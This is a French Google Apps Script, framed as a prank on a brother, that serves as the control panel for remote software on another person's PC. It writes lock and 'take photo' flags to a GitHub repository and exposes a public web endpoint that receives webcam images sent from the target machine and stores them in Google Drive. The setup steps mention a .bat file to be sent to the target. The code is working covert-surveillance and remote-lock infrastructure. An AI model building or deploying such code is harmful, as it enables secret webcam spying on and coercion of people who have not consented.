// ================================================================
// PANNEAU DE CONTROLE FRERE — Google Apps Script
//
// Installation :
// 1. Google Sheets -> Extensions -> Apps Script -> coller ce code
// 2. Creer un dossier Google Drive "📸 Blague Frere"
//    -> clic droit -> Obtenir le lien -> copier l'ID dans FOLDER_ID
// 3. Projet -> Parametres -> Proprietes de script -> ajouter :
//       GITHUB_TOKEN = ghp_...
// 4. Deployer -> Nouvelle application Web
//       Executer en tant que : Moi
//       Qui peut acceder : Tout le monde
//    -> copier l'URL -> mettre dans WEBAPP_URL du .bat avant envoi
// 5. Declencheurs -> nettoyerPhotos -> Minuteur -> Chaque jour
// 6. Dans la feuille : Insertion -> Dessin -> creer des boutons
//    et assigner les fonctions ci-dessous
// ================================================================

const FOLDER_ID  = 'REMPLACER_PAR_ID_DOSSIER_DRIVE';
const OWNER      = 'thesangu';
const REPO       = 'Aventuuuure';
const BRANCH     = 'main';
const LOCK_PATH  = 'data/blague_lock.json';
const PHOTO_PATH = 'data/blague_photo.json';
const JOURS_MAX  = 30;

function _token() {
  return PropertiesService.getScriptProperties().getProperty('GITHUB_TOKEN');
}

function _githubGet(path) {
  const resp = UrlFetchApp.fetch(
    `https://api.github.com/repos/${OWNER}/${REPO}/contents/${path}?ref=${BRANCH}`,
    { headers: { Authorization: `Bearer ${_token()}`, Accept: 'application/vnd.github+json' }, muteHttpExceptions: true }
  );
  return JSON.parse(resp.getContentText());
}

function _githubPut(path, content, sha) {
  UrlFetchApp.fetch(
    `https://api.github.com/repos/${OWNER}/${REPO}/contents/${path}`,
    {
      method: 'put',
      headers: { Authorization: `Bearer ${_token()}`, Accept: 'application/vnd.github+json', 'Content-Type': 'application/json' },
      payload: JSON.stringify({ message: 'update', content: Utilities.base64Encode(JSON.stringify(content)), sha, branch: BRANCH }),
      muteHttpExceptions: true
    }
  );
}

// ── LOCKSCREEN ──────────────────────────────────────────────────

function bloquerFrere() {
  const f = _githubGet(LOCK_PATH);
  _githubPut(LOCK_PATH, { locked: true }, f.sha);
  SpreadsheetApp.getUi().alert('🔒 PC verrouillé ! Attends son coup de fil...');
}

function debloquerFrere() {
  const f = _githubGet(LOCK_PATH);
  _githubPut(LOCK_PATH, { locked: false }, f.sha);
  SpreadsheetApp.getUi().alert('✅ PC déverrouillé. Tu es magnanime.');
}

// ── WEBCAM ───────────────────────────────────────────────────────

function prendrePhoto() {
  const f = _githubGet(PHOTO_PATH);
  _githubPut(PHOTO_PATH, { take_photo: true }, f.sha);
  SpreadsheetApp.getUi().alert('📸 Signal envoyé ! Photo dans quelques secondes dans le dossier Drive.');
}

// ── GESTION PHOTOS ───────────────────────────────────────────────

function voirPhotos() {
  const url = `https://drive.google.com/drive/folders/${FOLDER_ID}`;
  const html = HtmlService.createHtmlOutput(`<script>window.open('${url}');google.script.host.close();</script>`);
  SpreadsheetApp.getUi().showModalDialog(html, 'Ouverture du dossier...');
}

function supprimerToutesPhotos() {
  const ui = SpreadsheetApp.getUi();
  const rep = ui.alert('⚠️ Supprimer TOUTES les photos ?', ui.ButtonSet.YES_NO);
  if (rep !== ui.Button.YES) return;
  const folder = DriveApp.getFolderById(FOLDER_ID);
  const files  = folder.getFiles();
  let count = 0;
  while (files.hasNext()) { files.next().setTrashed(true); count++; }
  ui.alert(`🗑️ ${count} photo(s) supprimée(s).`);
}

// Declencheur automatique : a configurer sur "Chaque jour"
function nettoyerPhotos() {
  const folder = DriveApp.getFolderById(FOLDER_ID);
  const files  = folder.getFiles();
  const limite = new Date();
  limite.setDate(limite.getDate() - JOURS_MAX);
  while (files.hasNext()) {
    const f = files.next();
    if (f.getDateCreated() < limite) f.setTrashed(true);
  }
}

// ── WEB APP : recoit les photos du PC du frere ───────────────────

function doPost(e) {
  try {
    const data  = JSON.parse(e.postData.contents);
    const bytes = Utilities.base64Decode(data.image);
    const blob  = Utilities.newBlob(bytes, 'image/jpeg', data.filename);
    DriveApp.getFolderById(FOLDER_ID).createFile(blob);
    return ContentService.createTextOutput('ok');
  } catch (err) {
    return ContentService.createTextOutput('error: ' + err.message);
  }
}
